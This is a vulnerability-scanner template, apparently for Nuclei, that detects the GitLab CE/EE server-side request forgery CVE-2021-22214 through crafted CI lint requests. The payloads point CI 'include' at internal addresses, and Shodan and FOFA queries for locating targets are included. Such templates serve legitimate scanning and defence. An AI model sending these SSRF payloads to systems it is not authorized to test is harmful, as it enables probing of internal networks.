http:
- matchers:
  - part: body
    type: word
    words:
    - does not have valid YAML syntax!
  - part: content_type
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  payloads:
    body:
    - '{"content":"include:\n  remote: http://127.0.0.1/test.yml"}'
    - '{"content": "include:\n  remote: http://127.0.0.1:9100/test.yml"}'
  raw:
  - 'POST /api/v4/ci/lint?include_merged_yaml=true HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {{body}}

    '
  stop-at-first-match: true
id: CVE-2021-22214
info:
  author: Suman_Kar,GitLab Red Team
  classification:
    cpe: cpe:2.3:a:gitlab:gitlab:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-22214
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-918
    epss-percentile: 0.99814
    epss-score: 0.9352
  description: 'GitLab CE/EE versions starting from 10.5 are susceptible to a server-side
    request forgery vulnerability when requests to the internal network for webhooks
    are enabled, even on a GitLab instance where registration is limited. The same
    vulnerability actually spans multiple CVEs, due to similar reports that were fixed
    across separate patches. These CVEs are:

    - CVE-2021-39935

    - CVE-2021-22214

    - CVE-2021-22175

    '
  impact: 'Successful exploitation of this vulnerability can lead to unauthorized
    access to internal resources, potential data leakage, and further attacks on the
    system.

    '
  metadata:
    fofa-query: title="gitlab"
    google-query: intitle:"gitlab"
    max-request: 1
    product: gitlab
    shodan-query:
    - http.title:"GitLab"
    - cpe:"cpe:2.3:a:gitlab:gitlab"
    - http.title:"gitlab"
    vendor: gitlab
  name: Gitlab CE/EE 10.5 - Server-Side Request Forgery
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22214
  - https://nvd.nist.gov/vuln/detail/CVE-2021-39935
  - https://nvd.nist.gov/vuln/detail/CVE-2021-22175
  - https://vin01.github.io/piptagole/gitlab/ssrf/security/2021/06/15/gitlab-ssrf.html
  - https://docs.gitlab.com/ee/api/lint.html
  remediation: 'Upgrade Gitlab CE/EE to a version that is not affected by the vulnerability
    (10.6 or higher).

    '
  severity: high
  tags: cve2021,cve,gitlab,ssrf,vkev,vuln
